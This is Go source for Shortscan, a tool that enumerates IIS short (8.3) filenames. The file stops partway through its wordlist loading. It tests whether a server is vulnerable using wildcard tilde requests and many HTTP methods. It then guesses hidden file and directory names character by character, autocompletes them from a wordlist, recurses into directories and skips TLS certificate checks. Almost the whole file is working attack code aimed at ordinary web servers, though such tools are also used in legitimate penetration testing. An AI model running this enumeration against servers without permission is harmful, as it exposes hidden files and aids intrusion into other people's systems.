// ------------------------------------------------------
// Shortscan
// An IIS short filename enumeration tool by bitquark
// ------------------------------------------------------
// Docs and code: https://github.com/bitquark/shortscan
// ------------------------------------------------------

package shortscan

import (
	"os"
	"fmt"
	"sync"
	"time"
	"bufio"
	"embed"
	"regexp"
	"strings"
	"math/rand"
	"crypto/tls"
	"encoding/json"
	"net/http"
	"net/http/httputil"
	"github.com/fatih/color"
	"github.com/alexflint/go-arg"
	"github.com/bitquark/shortscan/pkg/maths"
	"github.com/bitquark/shortscan/pkg/shortutil"
	"github.com/bitquark/shortscan/pkg/levenshtein"
	log "github.com/sirupsen/logrus"
	nurl "net/url"
)

type baseRequest struct {
	url   string
	file  string
	tilde string
	ext   string
}

type httpStats struct {
	sync.Mutex
	bytesTx  int
	bytesRx  int
	requests int
	retries  int
}

type markers struct {
	statusPos int
	statusNeg int
}

type distances struct {
	distance float32
	body     string
}

type wordlistRecord struct {
	checksums   string
	filename    string
	extension   string
	filename83  string
	extension83 string
}

type wordlistConfig struct {
	wordlist  []wordlistRecord
	isRainbow bool
	sync.Mutex
}

type attackConfig struct {
	method            string
	suffix            string
	tildes            []string
	fileChars         map[string]string
	extChars          map[string]string
	foundFiles        map[string]struct{}
	foundDirectories  map[string]struct{}
	wordlist          wordlistConfig
	distanceMutex     sync.Mutex
	autocompleteMutex sync.Mutex
}

type resultOutput struct {
	Type      string `json:"type"`
	FullMatch bool   `json:"fullmatch"`
	BaseUrl   string `json:"baseurl"`
	File      string `json:"shortfile"`
	Ext       string `json:"shortext"`
	Tilde     string `json:"shorttilde"`
	Partname  string `json:"partname"`
	Fullname  string `json:"fullname"`
}

type statusOutput struct {
	Type       string `json:"type"`
	Url        string `json:"url"`
	Server     string `json:"server"`
	Vulnerable bool   `json:"vulnerable"`
}

type statsOutput struct {
	Type          string `json:"type"`
	Requests      int    `json:"requests"`
	Retries       int    `json:"retries"`
	SentBytes     int    `json:"sentbytes"`
	ReceivedBytes int    `json:"receivedbytes"`
}

// Version, rainbow table magic, default character set
const version = "0.9.0"
const rainbowMagic = "#SHORTSCAN#"
const alphanum = "JFKGOTMYVHSPCANDXLRWEBQUIZ8549176320"

// Standard headers + IIS DEBUG, ordered roughly by frequency and probable response time
// https://www.iana.org/assignments/http-methods/http-methods.xhtml#methods
var httpMethods = [...]string{
	"OPTIONS", "HEAD", "TRACE", "DEBUG", "GET", "POST", "PUT", "PATCH", "DELETE", "ACL",
	"BASELINE-CONTROL", "BIND", "CHECKIN", "CHECKOUT", "CONNECT", "COPY", "LABEL", "LINK",
	"LOCK", "MERGE", "MKACTIVITY", "MKCALENDAR", "MKCOL", "MKREDIRECTREF", "MKWORKSPACE",
	"MOVE", "ORDERPATCH", "PRI", "PROPFIND", "PROPPATCH", "REBIND", "REPORT", "SEARCH",
	"UNBIND", "UNCHECKOUT", "UNLINK", "UNLOCK", "UPDATE", "UPDATEREDIRECTREF", "VERSION-CONTROL",
}

// Path suffixes to try
var pathSuffixes = [...]string{"/", "", "/.aspx", "?aspxerrorpath=/", "/.aspx?aspxerrorpath=/", "/.asmx", "/.vb"}

// Embed the default wordlist
//
//go:embed resources/wordlist.txt
var defaultWordlist embed.FS

// Caches and regexes
var statusCache map[string]map[int]struct{}
var distanceCache map[string]map[int]distances
var checksumRegex *regexp.Regexp

// Command-line arguments and help
type arguments struct {
	Urls         []string `arg:"positional,required" help:"url to scan (multiple URLs can be specified)" placeholder:"URL"`
	Wordlist     string   `arg:"-w" help:"combined wordlist + rainbow table generated with shortutil" placeholder:"FILE"`
	Headers      []string `arg:"--header,-H,separate" help:"header to send with each request (use multiple times for multiple headers)"`
	Concurrency  int      `arg:"-c" help:"number of requests to make at once" default:"20"`
	Timeout      int      `arg:"-t" help:"per-request timeout in seconds" placeholder:"SECONDS" default:"10"`
	Output       string   `arg:"-o" help:"output format (human = human readable; json = JSON)" placeholder:"format" default:"human"`
	Verbosity    int      `arg:"-v" help:"how much noise to make (0 = quiet; 1 = debug; 2 = trace)" default:"0"`
	FullUrl      bool     `arg:"-F" help:"display the full URL for confirmed files rather than just the filename" default:"false"`
	NoRecurse    bool     `arg:"-n" help:"don't detect and recurse into subdirectories (disabled when autocomplete is disabled)" default:"false"`
	Stabilise    bool     `arg:"-s" help:"attempt to get coherent autocomplete results from an unstable server (generates more requests)" default:"false"`
	Patience     int      `arg:"-p" help:"patience level when determining vulnerability (0 = patient; 1 = very patient)" placeholder:"LEVEL" default:"0"`
	Characters   string   `arg:"-C" help:"filename characters to enumerate" default:"JFKGOTMYVHSPCANDXLRWEBQUIZ8549176320-_()&'!#$%@^{}~"`
	Autocomplete string   `arg:"-a" help:"autocomplete detection mode (auto = autoselect; method = HTTP method magic; status = HTTP status; distance = Levenshtein distance; none = disable)" placeholder:"mode" default:"auto"`
	IsVuln       bool     `arg:"-V" help:"bail after determining whether the service is vulnerable" default:"false"`
}

func (arguments) Version() string {
	return getBanner()
}

var args arguments

// getBanner returns the main banner
func getBanner() string {
	return color.New(color.FgBlue, color.Bold).Sprint("🌀 Shortscan v"+version) + " · " + color.New(color.FgWhite, color.Bold).Sprint("an IIS short filename enumeration tool by bitquark")
}

// pathEscape returns an escaped URL with spaces encoded as %20 rather than + (which can cause odd behaviour from IIS in some modes)
func pathEscape(url string) string {
	return strings.Replace(nurl.QueryEscape(url), "+", "%20", -1)
}

// fetch requests the given URL and returns an HTTP response object, handling retries gracefully
func fetch(hc *http.Client, st *httpStats, method string, url string) (*http.Response, error) {

	// Create a request object
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		log.WithFields(log.Fields{"err": err}).Fatal("Unable to create request object")
	}

	// Default user agent
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/1337.00 (KHTML, like Gecko) Chrome/1337.0.0.0 Safari/1337.00")

	// Loop through custom headers
	for _, h := range args.Headers {

		// Split the header (the alternative is to use textproto.ReadMIMEHeader(), but that's more involved)
		hs := strings.SplitN(h, ":", 2)
		if len(hs) != 2 {
			log.WithFields(log.Fields{"header": h}).Fatal("Invalid header")
		}

		// Add the header (host requires handling a little differently)
		h, v := strings.Trim(hs[0], " "), strings.Trim(hs[1], " ")
		if strings.ToLower(h) == "host" {
			req.Host = v
		} else {
			req.Header.Add(h, v)
		}

	}

	// Request loop
	var t int
	var rerr error
	var res *http.Response
	for t = 0; t < 4; t++ {

		// Make the request and break the loop if everything went well
		res, rerr = hc.Do(req)
		if err == nil {
			break
		}

		// Back off and retry if there was an error
		d := time.Duration(t*2) * time.Second
		log.WithFields(log.Fields{"err": rerr}).Trace(fmt.Sprintf("fetch() failed, retrying in %s", d))
		time.Sleep(d)

	}

	// Return the last error if there's no result
	if res == nil {
		return nil, rerr
	}

	// Debug
	log.WithFields(log.Fields{"method": method, "url": url, "status": res.StatusCode}).Trace("fetch()")

	// Update request stats
	st.Lock()
	st.requests++
	st.retries += t
	if r, err := httputil.DumpRequestOut(req, true); err == nil {
		st.bytesTx += len(r)
	} else {
		log.WithFields(log.Fields{"err": err}).Fatal("Error dumping request")
	}
	if r, err := httputil.DumpResponse(res, true); err == nil {
		st.bytesRx += len(r)
	} else {
		log.WithFields(log.Fields{"err": err}).Fatal("Error dumping response")
	}
	st.Unlock()

	// Closing the response body allows the connection to be reused
	res.Body.Close()

	// Return the result
	return res, nil

}

// enumerate builds and fetches candidate short name URLs making use of recursion
func enumerate(sem chan struct{}, wg *sync.WaitGroup, hc *http.Client, st *httpStats, ac *attackConfig, mk markers, br baseRequest) {

	// Extension enumeration mode
	extMode := len(br.ext) > 0

	// Select the character map to use
	var chars string
	if extMode {
		chars = ac.extChars[br.tilde]
	} else {
		chars = ac.fileChars[br.tilde]
	}

	// Loop through characters
	for _, char := range chars {

		// Increment the waitgroup
		wg.Add(1)

		// Check goroutine
		go func(sem chan struct{}, wg *sync.WaitGroup, hc *http.Client, ac *attackConfig, mk markers, br baseRequest, char string) {

			// Waitgroup and semaphore handling
			sem <- struct{}{}
			defer func(sem chan struct{}, wg *sync.WaitGroup) {
				<-sem
				wg.Done()
			}(sem, wg)

			// Workaround for an IIS bug which makes the two characters following a percent sign
			// in the 0-F range always return a match (so we just skip them)
			if char == "%" {
				var x, y int
				if extMode {
					x, y = len(br.ext), 1
				} else {
					x, y = len(br.file), 4
				}
				for i := 0; i < 2 && x < y; i++ {
					char += "?"
				}
			}

			// Add the next character and build the initial check URL
			var url string
			if extMode {
				br.ext += char
				url = br.url + pathEscape(br.file) + br.tilde + pathEscape(br.ext) + "*" + ac.suffix
			} else {
				br.file += char
				url = br.url + pathEscape(br.file) + "*" + br.tilde + "*" + pathEscape(br.ext) + ac.suffix
			}

			// Check whether this looks like a hit
			res, err := fetch(hc, st, ac.method, url)
			if err == nil && res.StatusCode == mk.statusPos {

				// Check whether this is the full file part
				res, err := fetch(hc, st, ac.method, br.url+pathEscape(br.file)+br.tilde+"*"+pathEscape(br.ext)+ac.suffix)
				if err == nil && res.StatusCode == mk.statusPos {

					// Check whether there's an extension (some servers return a different status (e.g. 500 Internal Server Error)
					// when the full name matches, so this final check is loosened to a negative match so we don't miss anything)
					res, err := fetch(hc, st, ac.method, br.url+pathEscape(br.file)+br.tilde+pathEscape(br.ext)+ac.suffix)
					if err == nil && res.StatusCode != mk.statusNeg {

						// If autocomplete is enabled
						var fnr, method string
						if args.Autocomplete != "none" {

							// Look up candidate filenames if the file looks like a checkummed alias (e.g. A5FAB~1.HTM) and a rainbow table was provided
							var fnc []wordlistRecord
							if cm := ac.wordlist.isRainbow && checksumRegex.MatchString(br.file); cm {
								fnc = autodechecksum(ac, br)
							}

							// Create and add wordlist-based candidates
							fnc = append(fnc, autocomplete(ac, br)...)

							// Choose the request method
							if args.Autocomplete == "method" {
								method = "_"
							} else {
								method = "GET"
							}

							// Loop through each filename candidate
							for _, c := range fnc {

								// Encapsulated to simplify mutex handling
								func() {

									// Lock the mutex
									ac.autocompleteMutex.Lock()
									defer ac.autocompleteMutex.Unlock()

									// Set the path
									path := pathEscape(c.filename + c.extension)

									// Skip this filename if it collides with a known discovery
									if _, ok := ac.foundFiles[path]; ok {
										return
									}

									// Make a request to the candidate URL
									res, err := fetch(hc, st, method, br.url+path)

									// Skip this check if there was an error
									if err != nil {
										log.WithFields(log.Fields{"err": err, "method": method, "url": br.url + path}).Info("Existence check error")
										return
									}

									// Branch based on autocomplete mode
									if args.Autocomplete == "method" {

										// When an invalid HTTP method is sent, a "405 Method Not Allowed" response from IIS indicates that a file
										// exists; this check is less noisy (and often more reliable) than methods such as status or distance checks
										if res.StatusCode == 405 {
											fnr = path
										}

									} else if args.Autocomplete == "status" {

										// Check the response doesn't appear in this candidate's negative status set
										ss := getStatuses(c, br, hc, st)

										if _, e := ss[res.StatusCode]; !e {
											fnr = path
										}

									} else if args.Autocomplete == "distance" {

										// Get distances for this candidate
										dists := getDistances(c, br, hc, st, ac)

										// If the status code wasn't seen during sampling
										if dists[res.StatusCode] == (distances{}) {
											log.WithFields(log.Fields{"url": br.url + path, "status": res.StatusCode}).Info("Autocomplete got a status code hit")
											fnr = path
										} else {

											// Calculate Levenshtein distance between the response and the sample response
											b := make([]byte, 1024)
											res.Body.Read(b)
											body, sbody := string(b), dists[res.StatusCode].body
											lp := float32(levenshtein.Distance(sbody, body)) / float32(maths.Max(len(sbody), len(body)))

											// If the distance delta is more than 10%
											d := lp - dists[res.StatusCode].distance
											if d > 0.1 {
												log.WithFields(log.Fields{"url": br.url + path, "distance": lp, "delta": d}).Info("Autocomplete got a distance hit")
												fnr = path
											}

										}

									} else {

										// Bail if args.Autocomplete is unrecognised (this should never happen)
										log.Fatal("What are you doing here?")

									}

									// If a full filename was found
									if fnr != "" {

										// Add the autocomplete filename to the list
										ac.foundFiles[fnr] = struct{}{}

										// If recursion is enabled
										if !args.NoRecurse {

											// Make a HEAD request to the autocompleted URL
											res, err := fetch(hc, st, "HEAD", br.url+fnr)
											if err != nil {
												log.WithFields(log.Fields{"err": err, "method": "HEAD", "url": br.url + fnr}).Info("Directory recursion check error")
											} else {

												// Check whether this looks like a directory redirect
												if l := res.Header.Get("Location"); strings.HasSuffix(strings.ToLower(l), "/"+strings.ToLower(fnr)+"/") {

													// Add the directory to the list for later recursion
													ac.foundDirectories[fnr] = struct{}{}

												}

											}

										}

									}

								}()

								// Break the loop if there was an autocomple match
								if fnr != "" {
									break
								}

							}

						}

						// Indicate which parts of the filename are uncertain
						fn, fe := br.file, br.ext
						if len(fn) >= 6 {
							fn = fn + "?"
						}
						if len(fe) >= 4 {
							fe = fe + "?"
						}

						// Colourise and output the filename, file parts, and full filename
						if args.Output == "human" {

							var fp, ff string
							if fnr != "" {
								fp = color.HiBlackString(fn + fe)
								if args.FullUrl {
									ff = color.GreenString(br.url) + color.HiGreenString(pathEscape(strings.ToLower(fnr)))
								} else {
									ff = color.HiGreenString(fnr)
								}
							} else {
								if len(br.file) < 6 {
									fn = color.GreenString(fn)
								}
								if len(br.ext) < 4 {
									fe = color.GreenString(fe)
								}
								fp = strings.Replace(fn+fe, "?", color.HiBlackString("?"), -1)
							}
							printHuman(fmt.Sprintf("%-20s %-28s %s", br.file+br.tilde+br.ext, fp, ff))

						} else {

							// Output JSON result if requested
							o := resultOutput{
								Type:      "result",
								FullMatch: fnr != "",
								BaseUrl:   br.url,
								File:      br.file,
								Tilde:     br.tilde,
								Ext:       br.ext,
								Partname:  fn + fe,
								Fullname:  fnr,
							}
							printJSON(o)

						}

					} else if err == nil && len(br.ext) > 0 {

						// This gets hit if the full match response is the same as the negative match (may need future work)
						log.WithFields(log.Fields{"status": res.StatusCode, "statusNeg": mk.statusNeg, "filename": br.file + br.tilde + br.ext + ac.suffix}).
							Debug("Possible hit, but status is the same as a negative match")

					}

					// Kick off file extension discovery
					if len(br.ext) == 0 {
						nr := br
						nr.ext = "."
						enumerate(sem, wg, hc, st, ac, mk, nr)
					}

				}

				// If the rabbit hole goes deeper
				if (extMode && len(br.ext) < 4) || (!extMode && len(br.file) < 6) {

					// Build the character check URL
					var url string
					if extMode {
						url = br.url + pathEscape(br.file) + br.tilde + pathEscape(br.ext) + "%3f*" + ac.suffix
					} else {
						url = br.url + pathEscape(br.file) + "%3f*" + br.tilde + "*" + pathEscape(br.ext) + ac.suffix
					}

					// Recurse if there are more characters in the name
					res, err = fetch(hc, st, ac.method, url)
					if err == nil && res.StatusCode != mk.statusNeg {
						enumerate(sem, wg, hc, st, ac, mk, br)
					}

				}

			}

		}(sem, wg, hc, ac, mk, br, string(char))

	}

}

// autocomplete returns a list of possible full filenames for a given tilde filename
func autocomplete(ac *attackConfig, br baseRequest) []wordlistRecord {

	// Match the filename against each wordlist entry
	var fs = make(map[string]wordlistRecord)
	var ch = make(chan wordlistRecord, 1024)
	go getWordlist(ch, ac)
	for record := range ch {

		// If the discovered filename and extension match the wordlist entry add the word to the list
		if br.file == record.filename83 && br.ext[maths.Min(len(br.ext), 1):] == record.extension83 {
			fs[record.filename+record.extension] = record
		}

	}

	// Convert the guess set to a slice
	f := make([]wordlistRecord, 0, len(fs))
	for _, v := range fs {
		f = append(f, v)
	}

	// Logging
	if len(f) > 0 {
		log.WithFields(log.Fields{"file": br.file, "ext": br.ext, "count": len(f)}).Info("Autocomplete found candidates")
		log.WithFields(log.Fields{"candidates": f}).Trace("Autocomplete candidates")
	}

	// Return the slice
	return f

}

// autodechecksum tries to reconstitute Windows checksummed filenames
func autodechecksum(ac *attackConfig, br baseRequest) []wordlistRecord {

	// Get the 1-2 prefix letters and potential checksum
	l := 2 - (6 - len(br.file))
	prefix, checksum := br.file[:l], br.file[l:]
	log.WithFields(log.Fields{"file": br.file, "prefix": prefix, "checksum": checksum}).Info("Possible checksummed alias")

	// Match the checksum and prefix against each wordlist entry
	var fs = make(map[string]wordlistRecord)
	var ch = make(chan wordlistRecord, 1024)
	go getWordlist(ch, ac)
	for record := range ch {

		// If the potential checksum matches a wordlist checksum and the filename prefix and extension match
		for i := 0; i < len(record.checksums); i += 4 {
			c := record.checksums[i : i+4]
			if c == checksum && strings.HasPrefix(strings.ToUpper(record.filename), prefix) && strings.HasPrefix(strings.ToUpper(record.extension), br.ext) {
				fs[record.filename+record.extension] = record
			}
		}

	}

	// Convert the guess set to a slice
	f := make([]wordlistRecord, 0, len(fs))
	for _, v := range fs {
		f = append(f, v)
	}

	// Logging
	if len(f) > 1 {
		log.WithFields(log.Fields{"file": br.file, "ext": br.ext, "count": len(f)}).Info("Dechecksum found candidates")
		log.WithFields(log.Fields{"candidates": f}).Trace("Dechecksum candidates")
	}

	// Return the slice
	return f

}

// getStatuses fetches non-existent URLs and returns a list of response statuses
func getStatuses(c wordlistRecord, br baseRequest, hc *http.Client, st *httpStats) map[int]struct{} {

	// Returned cached statuses if they exist
	if len(statusCache[c.extension]) > 0 {
		return statusCache[c.extension]
	}

	// Set loop count based on stability
	l := 2
	if args.Stabilise {
		l = 12
	}

	// Loop
	statuses := make(map[int]struct{}, l)
	for i := 0; i < l; i++ {

		// Generate a random filename with the autocomplete candidate file extension
		path := randPath(rand.Intn(4)+8, 0, alphanum) + c.extension

		// Fetch the URL
		if res, err := fetch(hc, st, "GET", br.url+path); err == nil {
			statuses[res.StatusCode] = struct{}{}
		}

	}

	// Logging
	log.WithFields(log.Fields{"extension": c.extension, "statuses": statuses}).Info("Got non-existent file statuses")

	// Cache and return the statuses
	statusCache[c.extension] = statuses
	return statuses

}

// getDistances calculates response distances for the given URL
func getDistances(c wordlistRecord, br baseRequest, hc *http.Client, st *httpStats, ac *attackConfig) map[int]distances {

	// Lock the mutex
	ac.distanceMutex.Lock()
	defer ac.distanceMutex.Unlock()

	// Return distances if cached
	if len(distanceCache[c.extension]) > 0 {
		return distanceCache[c.extension]
	}

	// Status
	log.WithFields(log.Fields{"url": br.url, "extension": c.extension}).Info("Sampling responses for Levenshtein distance calculation")

	// Set loop count based on stability
	l := 4
	if args.Stabilise {
		l = 24
	}

	// Sample some random URLs and calculate distances between the first 1k of the response body
	bodies := make(map[int][]string, l)
	highdist := make(map[int]float32, l)
	dists := make(map[int]distances)
	var path string
	for i := 0; i < l; i++ {

		// Generate a random path ending in the candidate file extension
		path = randPath(rand.Intn(4)+8, 0, alphanum) + c.extension

		// Fetch the URL
		if res, err := fetch(hc, st, "GET", br.url+path); err == nil {

			// Read body (not checking for EOF, because an empty body still needs a sample)
			b := make([]byte, 1024)
			res.Body.Read(b)
			body := string(b)
			for j := 0; j < len(bodies[res.StatusCode])-1; j++ {

				// Calculate Levenshtein distance
				ld := levenshtein.Distance(bodies[res.StatusCode][j], body)

				// Turn the distance into a percentage
				lp := float32(ld) / float32(maths.Max(len(bodies[res.StatusCode][j]), len(body)))

				// Store the highest distance and corresponding response for later comparison
				if dists[res.StatusCode] == (distances{}) || lp > highdist[res.StatusCode] {
					dists[res.StatusCode] = distances{lp, body}
					highdist[res.StatusCode] = lp
				}

			}

			// Save the response sample
			bodies[res.StatusCode] = append(bodies[res.StatusCode], body)

		}
	}

	// Log calculated distances
	for s, d := range dists {
		log.WithFields(log.Fields{"extension": c.extension, "status": s, "distance": d.distance}).Info("Calculated Levenshtein distance")
	}

	// Cache and return
	distanceCache[c.extension] = dists
	return dists

}

// getWordlist returns wordlist entries
func getWordlist(ch chan wordlistRecord, ac *attackConfig) {

	// Lock the wordlist
	ac.wordlist.Lock()

	// Return each word
	for _, record := range ac.wordlist.wordlist {
		ch <- record
	}

	// Unlock the wordlist and close the channel
	ac.wordlist.Unlock()
	close(ch)

}

// randPath returns a random path built with the provided characters
func randPath(l int, d int, chars string) string {
	c := len(chars)
	b := make([]byte, l)
	for i := range b {
		b[i] = chars[rand.Intn(c)]
	}
	for i := 0; i < d; i++ {
		b[rand.Intn(l)] = '.'
	}
	return pathEscape(string(b))
}

// printHuman prints human readable output if enabled
func printHuman(s ...any) {
	if args.Output == "human" {
		fmt.Println(s...)
	}
}

// printJSON prints JSON formatted output if enabled
func printJSON(o any) {
	if args.Output == "json" {
		j, _ := json.Marshal(o)
		fmt.Println(string(j))
	}
}

// Scan starts enumeration of the given URL
func Scan(urls []string, hc *http.Client, st *httpStats, wc wordlistConfig, mk markers) {

	// Loop through each URL
	for len(urls) > 0 {

		// Pop off a URL
		var url string
		url, urls = urls[0], urls[1:]
		url = strings.TrimSuffix(url, "/") + "/"

		// Default to HTTPS if no protocol was supplied
		if !strings.Contains(url, "://") {
			url = "https://" + url
		}

		// -----------------------------------------------
		// Pre-flight: check that the server is accessible
		// -----------------------------------------------

		// Validate the URL
		if _, err := nurl.Parse(url); err != nil {
			log.WithFields(log.Fields{"url": url, "error": err}).Fatal("Unable to parse URL")
		}

		// Grab some headers and make sure the URL is accessible
		res, err := fetch(hc, st, "GET", url+".aspx")
		if err != nil {
			log.WithFields(log.Fields{"error": err}).Fatal("Unable to access server")
		}

		// Display server information
		printHuman("\n════════════════════════════════════════════════════════════════════════════════")
		printHuman(color.New(color.FgWhite, color.Bold).Sprint("URL")+":", url)
		srv := "<unknown>"
		if len(res.Header["Server"]) > 0 {
			srv = strings.Join(res.Header["Server"], ", ")
		}
		if v, ok := res.Header["X-Aspnet-Version"]; ok {
			srv += " (ASP.NET v" + v[0] + ")"
		}
		if args.Output == "human" && srv != "<unknown>" && !strings.Contains(srv, "IIS") && !strings.Contains(srv, "ASP") {
			srv += " " + color.HiRedString("[!]")
		}
		printHuman(color.New(color.FgWhite, color.Bold).Sprint("Running")+":", srv)

		// If autocomplete is in autoselect mode
		if args.Autocomplete == "auto" {

			// Check whether requesting a valid URL with an invalid HTTP method returns a 405 Method Not Allowed,
			// which autocomplete can use as a reliable method to detecting whether file candidates exist
			if res, err := fetch(hc, st, "_", url); err == nil && res.StatusCode == 405 {
				args.Autocomplete = "method"
				log.Info("Using method-based file existence checks")
			} else {
				args.Autocomplete = "status"
				log.Info("Using status-based file existence checks")
			}

		}

		// ---------------------------------------------------
		// First stage: check whether the server is vulnerable
		// ---------------------------------------------------

		// Initialise attack config
		ac := attackConfig{wordlist: wc}

		// Determine how many methods to try
		var pc, mc int
		if args.Patience == 1 {
			pc = len(pathSuffixes)
			mc = len(httpMethods)
		} else {
			pc = 4
			mc = 9
		}

		// Loop through path suffixes
		outerEscape:
		for _, suffix := range pathSuffixes[:pc] {

			// Loop through each method
			methodEscape:
			for _, method := range httpMethods[:mc] {

				// Make some requests for non-existent files
				var statusNeg int
				validMarkers := struct{ status bool }{true}
				for i := 0; i < 4; i++ {

					// Fetch a "bad" URL (tildes >= ~5 will never be created on Windows 2000 upwards)
					res, err := fetch(hc, st, method, fmt.Sprintf("%s*%d*%s", url, rand.Intn(5)+5, suffix))

					// Skip this method if all requests failed
					if err != nil {
						log.Debug("Method " + method + " failed, skipping")
						continue methodEscape
					}

					// Response status code
					status := res.StatusCode

					// Skip this method if the same status code wasn't received for every request
					if statusNeg != 0 && status != statusNeg {
						log.WithFields(log.Fields{"status": status, "statusNeg": statusNeg}).Debug("Method " + method + " unstable, skipping")
						continue methodEscape
					}

					// Store the negative response status code
					statusNeg = status

				}

				// If there's at least one usable marker
				if validMarkers.status {

					// Request available 8.3 files
					for i := 1; i <= 4; i++ {

						// Fetch the URL and check whether it looks like a hit
						res, err := fetch(hc, st, method, fmt.Sprintf("%s*~%d*%s", url, i, suffix))
						if err == nil {

							// Hit response status code
							statusPos := res.StatusCode

							// If this could be a hit
							if validMarkers.status && statusPos != statusNeg {

								// Fetch a "bad" URL and check the status doesn't match the status code we just got
								res, _ := fetch(hc, st, method, fmt.Sprintf("%s*~0*%s", url, suffix))
								if statusPos == res.StatusCode {

									// Could be rate limiting (...or we could have killed the server)
									log.WithFields(log.Fields{"statusPos": statusPos, "statusNeg": statusNeg}).Debug("Negative response differed, could be rate limiting or server instability")

								} else {

									// Update tilde list and status marker
									ac.tildes = append(ac.tildes, fmt.Sprintf("~%d", i))
									mk.statusPos = statusPos
									mk.statusNeg = statusNeg

								}

							}

						}

					}

					// If 8.3 files were found
					if len(ac.tildes) > 0 {
						ac.method = method
						ac.suffix = suffix
						break outerEscape
					}

				}

			}

		}

		// Output JSON status if requested
		printJSON(statusOutput{Type: "status", Url: url, Server: srv, Vulnerable: len(ac.tildes) > 0})

		// Skip this URL if no tilde files could be identified :'(
		if len(ac.tildes) == 0 {
			printHuman(color.New(color.FgWhite, color.Bold).Sprint("Vulnerable:"), color.HiBlueString("No"), "(or no 8.3 files exist)")
			printHuman("════════════════════════════════════════════════════════════════════════════════")
			continue
		}

		// We are GO for second stage
		printHuman(color.New(color.FgWhite, color.Bold).Sprint("Vulnerable:"), color.HiRedString("Yes!"))
		printHuman("════════════════════════════════════════════════════════════════════════════════")
		log.WithFields(log.Fields{"method": ac.method, "suffix": ac.suffix, "statusPos": mk.statusPos, "statusNeg": mk.statusNeg}).Info("Found working options")
		log.WithFields(log.Fields{"tildes": ac.tildes}).Info("Found tilde files")

		// Bail here if we're just running a vuln check
		if args.IsVuln {
			continue
		}

		// --------------------------------------------------
		// Second stage: find out which characters are in use
		// --------------------------------------------------

		// Loop twice, first to check file characters, then to check extension characters
		ac.fileChars, ac.extChars = make(map[string]string), make(map[string]string)
		for i := 0; i < 2; i++ {

			// Loop through characters and tilde levels
			for _, char := range args.Characters {
				for _, tilde := range ac.tildes {

					// Set the check URL and character map
					var cu string
					var cm map[string]string
					if i == 0 {
						cm = ac.fileChars
						cu = url + "*" + pathEscape(string(char)) + "*" + tilde + "*" + ac.suffix
					} else {
						cm = ac.extChars
						cu = url + "*" + tilde + "*" + pathEscape(string(char)) + "*" + ac.suffix
					}

					// Add hits to the character map
					res, err := fetch(hc, st, ac.method, cu)
					if err == nil && res.StatusCode != mk.statusNeg {
						cm[tilde] = cm[tilde] + string(char)
					}

				}
			}
		}

		// Status
		log.WithFields(log.Fields{"fileChars": ac.fileChars, "extChars": ac.extChars}).Info("Built character set")

		// --------------------------------------
		// Third stage: enumerate all the things!
		// --------------------------------------

		// Initialise things
		ac.foundFiles = make(map[string]struct{})
		ac.foundDirectories = make(map[string]struct{})
		sem := make(chan struct{}, args.Concurrency)
		wg := new(sync.WaitGroup)

		// Loop through the tilde pool
		for _, tilde := range ac.tildes {
			enumerate(sem, wg, hc, st, &ac, mk, baseRequest{url: url, file: "", tilde: tilde, ext: ""})
		}
		wg.Wait()

		// Prepend discovered directories for processing next iteration
		for dir := range ac.foundDirectories {
			urls = append([]string{url + dir + "/"}, urls...)
		}

		// <hr>
		printHuman("════════════════════════════════════════════════════════════════════════════════")

	}
	printHuman()

	// Fin
	printHuman(fmt.Sprintf("%s Requests: %d; Retries: %d; Sent %d bytes; Received %d bytes", color.New(color.FgWhite, color.Bold).Sprint("Finished!"), st.requests, st.retries, st.bytesTx, st.bytesRx))
	printJSON(statsOutput{Type: "statistics", Requests: st.requests, Retries: st.retries, SentBytes: st.bytesTx, ReceivedBytes: st.bytesRx})

}

// Run kicks off scans from the command line
func Run() {

	// First things first
	rand.Seed(time.Now().UTC().UnixNano())

	// Parse and validate command-line arguments
	p := arg.MustParse(&args)
	args.Autocomplete = strings.ToLower(args.Autocomplete)
	if args.Autocomplete != "auto" && args.Autocomplete != "method" && args.Autocomplete != "status" && args.Autocomplete != "distance" && args.Autocomplete != "none" {
		p.Fail("autocomplete must be one of: auto, status, method, none")
	}
	args.Output = strings.ToLower(args.Output)
	if args.Output != "human" && args.Output != "json" {
		p.Fail("output must be one of: human, json")
	}

	// Say hello
	printHuman(getBanner())

	// Warn if any filename characters are invalid (https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
	for _, c := range []string{"<", ">", ":", "\"", "/", "\\", "|", "?", "*"} {
		if strings.Contains(args.Characters, c) {
			log.WithFields(log.Fields{"character": c}).Warn("Invalid filename character; weird things may happen")
		}
	}

	// Set up logging
	log.SetFormatter(&log.TextFormatter{
		DisableLevelTruncation: true,
		DisableTimestamp:       true,
	})
	if args.Verbosity > 1 {
		log.SetLevel(log.TraceLevel)
	} else if args.Verbosity > 0 {
		log.SetLevel(log.DebugLevel)
	} else {
		log.SetLevel(log.WarnLevel)
	}

	// Build an HTTP client
	hc := &http.Client{
		Timeout:       time.Duration(args.Timeout) * time.Second,
		Transport:     &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true, Renegotiation: tls.RenegotiateOnceAsClient}, Proxy: http.ProxyFromEnvironment},
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
	}

	// Initialise things
	mk := markers{}
	st := &httpStats{}
	wc := wordlistConfig{}
	statusCache = make(map[string]map[int]struct{})
	distanceCache = make(map[string]map[int]distances)

	// Compile the checksum detection regex
	checksumRegex = regexp.MustCompile(".{1,2}[0-9A-F]{4}")

	// Select the wordlist
	var s *bufio.Scanner
	if args.Wordlist != "" {
		log.WithFields(log.Fields{"file": args.Wordlist}).Info("Using custom wordlist")
		fh, err := os.Open(args.Wordlist)
		if err != nil {
			log.WithFields(log.Fields{"err": err}).Fatal("Unable to open wordlist")
		}
		s = bufio.NewScanner(fh)
	} else {
		log.Info("Using built-in wordlist")
		fh, _ := defaultWordlist.Open("resources/wordlist.txt")
		s = bufio.NewScanner(fh)
	}

	// Read the wordlist into memory
	n := 0
	for s.Scan() {

		// Read the line
		line := s.Text()

		// Check the first line for the rainbow table magic value
		if n == 0 && line == rainbowMagic {
			wc.isRainbow = true
			log.Info("Rainbow table provided, enabling auto dechecksumming")
			continue
		}

		// Skip blank lines and comments
		if l := len(line); l == 0 || line[0] == '#' {
			continue
		}

		// Add the line to the wordlist
		if wc.isRainbow {

			// Check tab count
			if strings.Count(line, "\t") != 4 {
				log.WithFields(log.Fields{"line": line}).Fatal("Wordlist entry invalid (incorrect tab count)")
				log.Fatal("")
			}

